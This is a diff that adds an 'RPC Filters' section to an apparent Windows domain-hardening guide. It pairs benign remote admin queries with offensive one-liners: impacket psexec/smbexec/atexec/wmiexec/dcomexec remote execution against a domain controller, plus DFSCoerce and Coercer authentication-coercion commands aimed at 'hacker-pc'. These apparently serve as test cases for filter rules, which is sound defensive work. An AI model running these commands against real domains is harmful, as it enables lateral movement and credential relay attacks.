@@ -722,6 +722,74 @@ TODO: Rationale
 
 ## RPC Filters
 
+### RPC over Named Pipes
+
+### \[MS-SCMR\]: Service Control Manager Remote Protocol
+
+```shell
+sc.exe \\contoso-dc query wuauserv
+```
+
+```shell
+impacket-psexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+```shell
+impacket-smbexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+### \[MS-TSCH\]: Task Scheduler Service Remoting Protocol
+
+```shell
+schtasks.exe /query /s contoso-dc
+```
+
+```shell
+impacket-atexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+### WMI
+
+```powershell
+Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName contoso-dc
+```
+
+```shell
+impacket-wmiexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+### DCOM
+
+```shell
+impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+### \[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0
+
+```shell
+wevtutil.exe /r:contoso-dc qe System /c:1
+```
+
+### \[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol
+
+Restrict to Domain Admins
+
+```shell
+python3 DFSCoerce/dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc contoso-dc
+```
+
+### \[MS-RPRN\]: Print System Remote Protocol
+
+https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print
+
+TODO
+
+### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol
+
+```shell
+coercer coerce --target-ip contoso-dc --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
+```
+
 ## References
 
 - [MSRPC-To-ATT&CK](https://github.com/jsecurity101/MSRPC-to-ATTACK)
